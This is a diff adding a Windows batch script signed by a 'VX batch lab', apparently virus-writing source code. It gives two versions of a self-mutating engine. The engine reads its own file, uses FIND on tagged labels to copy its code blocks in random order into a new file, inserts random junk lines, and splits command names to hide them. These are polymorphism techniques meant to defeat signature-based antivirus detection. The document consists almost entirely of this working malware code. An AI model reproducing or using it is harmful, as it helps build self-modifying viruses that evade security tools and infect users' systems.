@@ -1,0 +1,75 @@
+
+-==---=-=-=--=-=-=-=-=-=-=-=--[V 1a - TRASH ADD ]---====---=-=-=-=-=--===-==-=-==-===-==-==--=-
+
+%ZZA%@ECHO OFF & SET V=""%0""
+%ZZA% GOTO P_1
+:P_1 %ZZX%
+%ZZX% CALL :P_6
+%ZZX% ::-------SET ENCRYPT ADD--------
+%ZZX% %E% P_2
+:P_2 %ZZC%
+%ZZC% ::-------USERCODE--------
+%ZZC% %E% P_3
+:P_3 %ZZV%
+%ZZV% ::-------USERCODE--------
+%ZZV% %E% P_4
+:P_4 %ZZB%
+%ZZB% ::-------USERCODE--------
+%ZZB% %C%.:%R%%Z%%Z%0%Z%8%R%3%Z%1%Z%>_
+%ZZB% %D% "ZZ%A%A"<%V%>>_
+%ZZB% %E% P_5
+:P_5 %ZZQ% 
+%ZZQ%	IF %R%==1 %F% %%_ IN (C U B X Q V) DO %C%.CLS %Z%12%Z%%Z%%R%4%Z%2%R%0%Z%%R%>>_&%D% "ZZ%%_" <%V%>>_
+%ZZQ%	IF %R%==2 %F% %%_ IN (U B X Q V C) DO %C%.CALL_ 05%Z%%R%%Z%%Z%%Z%0%R%%Z%5%R%>>_&%D% "ZZ%%_" <%V%>>_
+%ZZQ%	IF %R%==3 %F% %%_ IN (B X Q V C U) DO %C%.:%Z%%Z%%Z%%Z%%R%%Z%%Z%01%Z%%R%%Z%>>_&%D% "ZZ%%_" <%V%>>_
+%ZZQ%	IF %R%==4 %F% %%_ IN (X Q V C U B) DO %C%.SET %Z%8%R%%R%3%Z%%Z%%Z%%Z%%Z%%Z%>>_&%D% "ZZ%%_" <%V%>>_
+%ZZQ%	IF %R%==5 %F% %%_ IN (Q V C U B X) DO %C%.%C% %R%%Z%%Z%9%Z%%Z%%R%%R%%Z%5%Z%>>_&%D% "ZZ%%_" <%V%>>_
+%ZZQ%	IF %R%==6 %F% %%_ IN (V C U B X Q) DO %C%.EXIT /B %R%%R%%Z%%R%%Z%%Z%%Z%8%Z%>>_&%D% "ZZ%%_" <%V%>>_
+%ZZQ% EXIT
+:P_6 %ZZU%
+%ZZU%SET C=ECHO
+%ZZU%SET /A R=1+(6-1+1) * %RANDOM%/32768
+%ZZU%SET F=FOR
+%ZZU%SET Z=%R%%R%%RANDOM%%R%%R%%RANDOM%%R%%RANDOM%%R%
+%ZZU%SET E=GOTO
+%ZZU%SET D=FIND
+%ZZU% %E% :EOF
+
+-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-[ V 1b ]=-=-=-=-=-==-=-=---=-=-=-=-=---=-=-=-=-=-==
+
+:P_1 %ZZX%
+%ZZX% SET V=""%0""
+%ZZX% SET AX=ET
+%ZZX% CALL :P_6
+%ZZX% GOTO P_2
+:P_2 %ZZC%
+%ZZC% S%AX% SX=OT
+%ZZC% G%SX%O P_3
+:P_3 %ZZV%
+%ZZV% S%AX% DX=YP
+%ZZV% G%SX%O P_4
+:P_4 %ZZQ% 
+%ZZQ%	IF %X0%==1 S%AX% CV=C U B X Q V
+%ZZQ%	IF %X0%==2 S%AX% CV=U B X Q V C
+%ZZQ%	IF %X0%==3 S%AX% CV=B X Q V C U 
+%ZZQ%	IF %X0%==4 S%AX% CV=X Q V C U B 
+%ZZQ%	IF %X0%==5 S%AX% CV=Q V C U B X
+%ZZQ%	IF %X0%==6 S%AX% CV=V C U B X Q
+%ZZQ%	CALL :P_5
+%ZZQ% 	EXIT
+:P_5 %ZZB%
+%ZZB% ECHO.GOTO P_1>_
+%ZZB% F%F% %%_ IN (%CV%) DO (
+%ZZB% F%D% "ZZ%%_" <%V%>>_
+%ZZB% )
+%ZZB% G%SX%O :EOF
+:P_6 %ZZU%
+%ZZU%	SET /A X0=1+(6-1+1) * %RANDOM%/32768
+%ZZU%	S%AX% F=OR
+%ZZU%	S%AX% D=IND
+%ZZU% 	G%SX%O :EOF
+====-----====-=-=-=========--------=====-=-=-=======-=-====-=-=-=-=-==-=-=-=-
+
+====-------=-==-===-----==
+| DR RUSTAM/VX BATCH LAB |
+====--=-====-----=-=-====-
